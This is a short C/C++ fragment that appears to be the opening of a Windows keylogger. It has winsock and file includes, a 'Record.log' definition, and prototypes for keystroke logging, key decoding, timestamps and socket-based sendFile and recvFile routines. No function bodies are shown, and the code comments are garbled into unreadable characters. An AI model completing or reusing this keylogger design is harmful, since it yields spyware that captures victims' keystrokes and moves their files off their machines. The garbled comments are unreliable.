//service
#include<stdio.h> 
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//keylog
#include <windows.h>
#include <time.h>
#include <iostream> 
#include <string>
#include <fstream>
#define FILE_NAME "Record.log"
#define MIN_RECORD_SIZE 25

//file
#include <stdlib.h> 
#include <string.h> 


void logKey();  //��¼���� 
char* decode(int); // ���ܼ��� 
char* decodeCaps(int); //��д���� 
void logUserTime();  //ʱ��� 
bool checkRecordSize();  //�����ļ������� 
int KeyLog(); //���̼�¼���� 

void sendFile(SOCKET m_New_Socket); //�����ļ� 
void recvFile(SOCKET m_New_Socket);  //�����ļ�
void File(SOCKET m_New_Socket);//�����ļ������� 

